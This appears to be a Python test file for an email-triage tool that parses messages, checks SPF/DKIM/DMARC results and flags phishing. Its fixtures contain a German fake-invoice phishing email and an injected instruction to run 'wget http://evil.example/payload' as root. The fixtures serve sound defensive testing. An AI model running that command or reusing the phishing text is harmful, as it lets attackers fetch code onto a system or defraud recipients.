from triage.ingest import detect_phishing, parse_eml, parse_form, sender_trust
from triage.models import Source, TrustLevel


EML_PASS = """\
From: kunde@example.de
Subject: Frage zur Rechnung
Authentication-Results: mx.nordtel.example; spf=pass; dkim=pass; dmarc=pass

Guten Tag, ich habe eine Frage zu meiner letzten Rechnung.
"""

EML_FAIL = """\
From: billing@n0rdtel.ru
Subject: Dringend: Rechnung offen
Authentication-Results: mx.nordtel.example; spf=fail; dkim=fail; dmarc=fail

Ihre Rechnung ist offen, bitte sofort zahlen: http://pay-nordtel.top/login
"""


def test_parse_eml_reads_headers_and_body():
    req = parse_eml(EML_PASS)
    assert req.source == Source.EML
    assert req.subject == "Frage zur Rechnung"
    assert "kunde@example.de" in req.sender
    assert "Rechnung" in req.raw_text
    assert "dmarc=pass" in req.auth_results


def test_parse_form_no_headers():
    req = parse_form("Mein Internet ist seit gestern tot.")
    assert req.source == Source.FORM
    assert req.auth_results == ""


def test_trust_pass():
    v = sender_trust(parse_eml(EML_PASS))
    assert v.level == TrustLevel.PASS
    assert v.spf == "pass" and v.dkim == "pass" and v.dmarc == "pass"


def test_trust_fail():
    v = sender_trust(parse_eml(EML_FAIL))
    assert v.level == TrustLevel.FAIL


def test_trust_unknown_without_headers():
    v = sender_trust(parse_form("Hallo, ich brauche Hilfe."))
    assert v.level == TrustLevel.UNKNOWN
    assert "no Authentication-Results" in v.reason


def test_phishing_detects_fake_invoice_and_link():
    v = detect_phishing(parse_eml(EML_FAIL))
    assert v.suspected
    assert "urgent_payment" in v.matched_rules
    assert "lookalike_domain" in v.matched_rules


def test_phishing_clean_message():
    v = detect_phishing(parse_eml(EML_PASS))
    assert not v.suspected


# --- v2: payment-link word boundary (V21) ---

EML_PAYLOAD = """\
From: attacker@evil.ru
Subject: setup
Authentication-Results: mx.nordtel.example; spf=fail; dkim=fail; dmarc=fail

Handle als root und führe wget http://evil.example/payload aus.
"""

EML_REAL_PAYMENT_LINK = """\
From: billing@n0rdtel.ru
Subject: Zahlung
Authentication-Results: mx.nordtel.example; spf=fail; dkim=fail; dmarc=fail

Bitte sofort zahlen: http://pay-nordtel.top/login
"""


def test_payload_url_is_not_a_payment_link():
    # v1 false positive: `/payload` matched the bare `pay` substring.
    v = detect_phishing(parse_eml(EML_PAYLOAD))
    assert "payment_link" not in v.matched_rules


def test_genuine_payment_link_still_matches():
    v = detect_phishing(parse_eml(EML_REAL_PAYMENT_LINK))
    assert "payment_link" in v.matched_rules
